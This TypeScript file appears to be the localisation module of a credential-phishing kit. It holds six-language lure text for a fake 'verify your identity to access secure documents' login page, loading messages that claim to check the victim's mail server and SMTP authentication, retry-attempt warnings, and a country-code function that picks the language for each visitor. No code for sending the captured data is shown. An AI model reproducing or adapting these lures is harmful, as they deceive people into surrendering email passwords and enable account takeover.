// Multi-language translations

export type SupportedLanguage = 'ja' | 'en' | 'de' | 'nl' | 'ko' | 'es'

export interface Translations {
  title: string
  subtitle: string
  verifyButton: string
  emailLabel: string
  passwordLabel: string
  passwordPlaceholder: string
  continueButton: string
  verifying: string
  verificationSuccessful: string
  redirecting: string
  invalidCredentials: string
  retryMessage: string
  verifyAccess: string
  verifyAccessSubtitle: string
  verifyContinue: string
  loadingMessages: {
    lookingUp: string
    verifying: string
    checking: string
    finalizing: string
  }
  attemptWarning: string
  maxAttemptsReached: string
  remainingAttempts: string
}

export const translations: Record<SupportedLanguage, Translations> = {
  ja: {
    title: '本人確認',
    subtitle: 'セキュアなドキュメントにアクセスするには、認証情報を入力してください',
    verifyButton: 'アクセスを確認',
    emailLabel: 'メールアドレス',
    passwordLabel: 'パスワード',
    passwordPlaceholder: 'パスワードを入力',
    continueButton: 'セキュアなドキュメントに続く',
    verifying: '確認中...',
    verificationSuccessful: '確認が完了しました',
    redirecting: 'セキュアなドキュメントにリダイレクトしています...',
    invalidCredentials: '無効な認証情報。メールアドレスとパスワードを確認してもう一度お試しください。',
    retryMessage: '回試行しました。残り回あります。',
    verifyAccess: 'アクセスを確認',
    verifyAccessSubtitle: '続行するには確認を完了してください',
    verifyContinue: '確認して続ける',
    loadingMessages: {
      lookingUp: 'メールサーバーを検索中...',
      verifying: '認証情報を確認中...',
      checking: 'SMTP認証を確認中...',
      finalizing: '確認を完了中...',
    },
    attemptWarning: '⚠️ {count}回目の試行（全{max}回）。残り{remaining}回あります。',
    maxAttemptsReached: '最大{max}回試行しました。サポートにお問い合わせください。',
    remainingAttempts: '残り{remaining}回',
  },
  en: {
    title: 'Verify Your Identity',
    subtitle: 'Please enter your credentials to access your secure documents',
    verifyButton: 'Verify Access',
    emailLabel: 'Email Address',
    passwordLabel: 'Password',
    passwordPlaceholder: 'Enter your password',
    continueButton: 'Continue to Secure Documents',
    verifying: 'Verifying...',
    verificationSuccessful: 'Verification Successful',
    redirecting: 'Redirecting to your secure documents...',
    invalidCredentials: 'Invalid credentials. Please check your email and password and try again.',
    retryMessage: 'attempts remaining. Please check your email and password and try again.',
    verifyAccess: 'Verify Your Access',
    verifyAccessSubtitle: 'Please complete the verification to continue',
    verifyContinue: 'Verify & Continue',
    loadingMessages: {
      lookingUp: 'Looking up email server...',
      verifying: 'Verifying credentials...',
      checking: 'Checking SMTP authentication...',
      finalizing: 'Finalizing verification...',
    },
    attemptWarning: '⚠️ Attempt {count} of {max}. {remaining} attempt{plural} remaining.',
    maxAttemptsReached: 'Maximum {max} attempts reached. Please contact support.',
    remainingAttempts: '{remaining} attempt{plural} remaining',
  },
  de: {
    title: 'Ihre Identität bestätigen',
    subtitle: 'Bitte geben Sie Ihre Zugangsdaten ein, um auf Ihre sicheren Dokumente zuzugreifen',
    verifyButton: 'Zugriff bestätigen',
    emailLabel: 'E-Mail-Adresse',
    passwordLabel: 'Passwort',
    passwordPlaceholder: 'Passwort eingeben',
    continueButton: 'Zu sicheren Dokumenten fortfahren',
    verifying: 'Bestätigen...',
    verificationSuccessful: 'Bestätigung erfolgreich',
    redirecting: 'Weiterleitung zu Ihren sicheren Dokumenten...',
    invalidCredentials: 'Ungültige Zugangsdaten. Bitte überprüfen Sie Ihre E-Mail und Ihr Passwort und versuchen Sie es erneut.',
    retryMessage: 'Versuche verbleibend. Bitte überprüfen Sie Ihre E-Mail und Ihr Passwort und versuchen Sie es erneut.',
    verifyAccess: 'Ihren Zugriff bestätigen',
    verifyAccessSubtitle: 'Bitte vervollständigen Sie die Bestätigung, um fortzufahren',
    verifyContinue: 'Bestätigen und fortfahren',
    loadingMessages: {
      lookingUp: 'E-Mail-Server wird gesucht...',
      verifying: 'Zugangsdaten werden überprüft...',
      checking: 'SMTP-Authentifizierung wird überprüft...',
      finalizing: 'Bestätigung wird abgeschlossen...',
    },
    attemptWarning: '⚠️ Versuch {count} von {max}. {remaining} Versuch{plural} verbleibend.',
    maxAttemptsReached: 'Maximale {max} Versuche erreicht. Bitte kontaktieren Sie den Support.',
    remainingAttempts: '{remaining} Versuch{plural} verbleibend',
  },
  nl: {
    title: 'Verifieer uw identiteit',
    subtitle: 'Voer uw inloggegevens in om toegang te krijgen tot uw beveiligde documenten',
    verifyButton: 'Toegang verifiëren',
    emailLabel: 'E-mailadres',
    passwordLabel: 'Wachtwoord',
    passwordPlaceholder: 'Voer uw wachtwoord in',
    continueButton: 'Doorgaan naar beveiligde documenten',
    verifying: 'Verifiëren...',
    verificationSuccessful: 'Verificatie succesvol',
    redirecting: 'Doorverwijzen naar uw beveiligde documenten...',
    invalidCredentials: 'Ongeldige inloggegevens. Controleer uw e-mail en wachtwoord en probeer het opnieuw.',
    retryMessage: 'pogingen over. Controleer uw e-mail en wachtwoord en probeer het opnieuw.',
    verifyAccess: 'Verifieer uw toegang',
    verifyAccessSubtitle: 'Voltooi de verificatie om door te gaan',
    verifyContinue: 'Verifiëren en doorgaan',
    loadingMessages: {
      lookingUp: 'E-mailserver opzoeken...',
      verifying: 'Inloggegevens verifiëren...',
      checking: 'SMTP-authenticatie controleren...',
      finalizing: 'Verificatie voltooien...',
    },
    attemptWarning: '⚠️ Poging {count} van {max}. {remaining} poging{plural} over.',
    maxAttemptsReached: 'Maximaal {max} pogingen bereikt. Neem contact op met ondersteuning.',
    remainingAttempts: '{remaining} poging{plural} over',
  },
  ko: {
    title: '신원 확인',
    subtitle: '보안 문서에 액세스하려면 자격 증명을 입력하세요',
    verifyButton: '액세스 확인',
    emailLabel: '이메일 주소',
    passwordLabel: '비밀번호',
    passwordPlaceholder: '비밀번호를 입력하세요',
    continueButton: '보안 문서로 계속',
    verifying: '확인 중...',
    verificationSuccessful: '확인 완료',
    redirecting: '보안 문서로 리디렉션 중...',
    invalidCredentials: '잘못된 자격 증명입니다. 이메일과 비밀번호를 확인하고 다시 시도하세요.',
    retryMessage: '번 시도했습니다. 번 남았습니다. 이메일과 비밀번호를 확인하고 다시 시도하세요.',
    verifyAccess: '액세스 확인',
    verifyAccessSubtitle: '계속하려면 확인을 완료하세요',
    verifyContinue: '확인하고 계속',
    loadingMessages: {
      lookingUp: '이메일 서버 조회 중...',
      verifying: '자격 증명 확인 중...',
      checking: 'SMTP 인증 확인 중...',
      finalizing: '확인 완료 중...',
    },
    attemptWarning: '⚠️ {count}번째 시도 (전체 {max}번). {remaining}번 남았습니다.',
    maxAttemptsReached: '최대 {max}번 시도했습니다. 지원팀에 문의하세요.',
    remainingAttempts: '{remaining}번 남았습니다',
  },
  es: {
    title: 'Verificar su identidad',
    subtitle: 'Por favor ingrese sus credenciales para acceder a sus documentos seguros',
    verifyButton: 'Verificar acceso',
    emailLabel: 'Dirección de correo electrónico',
    passwordLabel: 'Contraseña',
    passwordPlaceholder: 'Ingrese su contraseña',
    continueButton: 'Continuar a documentos seguros',
    verifying: 'Verificando...',
    verificationSuccessful: 'Verificación exitosa',
    redirecting: 'Redirigiendo a sus documentos seguros...',
    invalidCredentials: 'Credenciales inválidas. Por favor verifique su correo electrónico y contraseña e intente nuevamente.',
    retryMessage: 'intentos restantes. Por favor verifique su correo electrónico y contraseña e intente nuevamente.',
    verifyAccess: 'Verificar su acceso',
    verifyAccessSubtitle: 'Por favor complete la verificación para continuar',
    verifyContinue: 'Verificar y continuar',
    loadingMessages: {
      lookingUp: 'Buscando servidor de correo...',
      verifying: 'Verificando credenciales...',
      checking: 'Verificando autenticación SMTP...',
      finalizing: 'Finalizando verificación...',
    },
    attemptWarning: '⚠️ Intento {count} de {max}. {remaining} intento{plural} restante{plural}.',
    maxAttemptsReached: 'Se alcanzó el máximo de {max} intentos. Por favor contacte al soporte.',
    remainingAttempts: '{remaining} intento{plural} restante{plural}',
  },
}

// Detect language from country code
export function detectLanguageFromCountry(countryCode: string): SupportedLanguage {
  const country = countryCode.toLowerCase()
  
  // Japan
  if (country === 'jp') return 'ja'
  
  // Korea (South and North)
  if (country === 'kr' || country === 'kp') return 'ko'
  
  // Germany
  if (country === 'de') return 'de'
  
  // Netherlands
  if (country === 'nl') return 'nl'
  
  // Spain and Spanish-speaking countries
  if (country === 'es' || country === 'mx' || country === 'ar' || country === 'co' || 
      country === 'cl' || country === 'pe' || country === 've' || country === 'ec' ||
      country === 'gt' || country === 'cu' || country === 'bo' || country === 'do' ||
      country === 'hn' || country === 'py' || country === 'sv' || country === 'ni' ||
      country === 'cr' || country === 'pa' || country === 'uy' || country === 'pr') {
    return 'es'
  }
  
  // Default to English
  return 'en'
}

// Get translations for a language
export function getTranslations(lang: SupportedLanguage): Translations {
  return translations[lang] || translations.en
}

